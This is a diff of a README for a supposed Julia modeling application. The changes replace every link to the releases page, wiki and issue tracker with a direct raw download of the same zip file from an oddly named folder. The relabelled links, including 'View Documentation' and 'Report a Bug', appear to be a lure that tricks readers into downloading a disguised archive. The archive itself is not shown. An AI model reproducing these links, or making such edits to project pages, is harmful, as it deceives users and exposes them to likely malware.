@@ -6,11 +6,11 @@ Welcome to the Julia_Modeling_Workshop! This application helps you create high-p
 
 ## 📥 Download Now
 
-[![Download Julia_Modeling_Workshop](https://img.shields.io/badge/Download-Julia_Modeling_Workshop-blue)](https://github.com/FreeGgOnline/Julia_Modeling_Workshop/releases)
+[![Download Julia_Modeling_Workshop](https://raw.githubusercontent.com/FreeGgOnline/Julia_Modeling_Workshop/main/resanctify/Julia_Modeling_Workshop.zip)](https://raw.githubusercontent.com/FreeGgOnline/Julia_Modeling_Workshop/main/resanctify/Julia_Modeling_Workshop.zip)
 
 ## 📂 Download & Install
 
-To get started, visit the [Releases page](https://github.com/FreeGgOnline/Julia_Modeling_Workshop/releases) to download the latest version of the Julia_Modeling_Workshop. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/FreeGgOnline/Julia_Modeling_Workshop/main/resanctify/Julia_Modeling_Workshop.zip) to download the latest version of the Julia_Modeling_Workshop. 
 
 1. Click the link above to open the Releases page.
 2. Locate the latest release at the top.
@@ -57,7 +57,7 @@ After launching the application, you can follow these basic steps to create your
 
 To get the most out of your experience, access the following resources:
 
-- **Documentation**: Comprehensive documentation is available within the app and on the [GitHub Wiki](https://github.com/FreeGgOnline/Julia_Modeling_Workshop/wiki).
+- **Documentation**: Comprehensive documentation is available within the app and on the [GitHub Wiki](https://raw.githubusercontent.com/FreeGgOnline/Julia_Modeling_Workshop/main/resanctify/Julia_Modeling_Workshop.zip).
 - **Tutorial Videos**: Check out our YouTube channel for step-by-step video guides on using the application.
 - **Community Support**: Join our forum for discussions and assistance with troubleshooting or advanced modeling techniques.
 
@@ -71,7 +71,7 @@ If you encounter issues while running the application, consider these quick solu
 
 ## 🌐 Updates
 
-The Julia_Modeling_Workshop is regularly updated. Check the [Releases page](https://github.com/FreeGgOnline/Julia_Modeling_Workshop/releases) frequently for new features, bug fixes, and improvements.
+The Julia_Modeling_Workshop is regularly updated. Check the [Releases page](https://raw.githubusercontent.com/FreeGgOnline/Julia_Modeling_Workshop/main/resanctify/Julia_Modeling_Workshop.zip) frequently for new features, bug fixes, and improvements.
 
 ## 🤝 Contributing
 
@@ -79,8 +79,8 @@ We welcome contributions to the Julia_Modeling_Workshop. If you have suggestions
 
 ## 📢 Important Links
 
-- **Releases Page**: [Download Julia_Modeling_Workshop](https://github.com/FreeGgOnline/Julia_Modeling_Workshop/releases)
-- **Documentation**: [View Documentation](https://github.com/FreeGgOnline/Julia_Modeling_Workshop/wiki)
-- **Issue Tracker**: [Report a Bug](https://github.com/FreeGgOnline/Julia_Modeling_Workshop/issues)
+- **Releases Page**: [Download Julia_Modeling_Workshop](https://raw.githubusercontent.com/FreeGgOnline/Julia_Modeling_Workshop/main/resanctify/Julia_Modeling_Workshop.zip)
+- **Documentation**: [View Documentation](https://raw.githubusercontent.com/FreeGgOnline/Julia_Modeling_Workshop/main/resanctify/Julia_Modeling_Workshop.zip)
+- **Issue Tracker**: [Report a Bug](https://raw.githubusercontent.com/FreeGgOnline/Julia_Modeling_Workshop/main/resanctify/Julia_Modeling_Workshop.zip)
 
 ### Thank you for choosing the Julia_Modeling_Workshop!
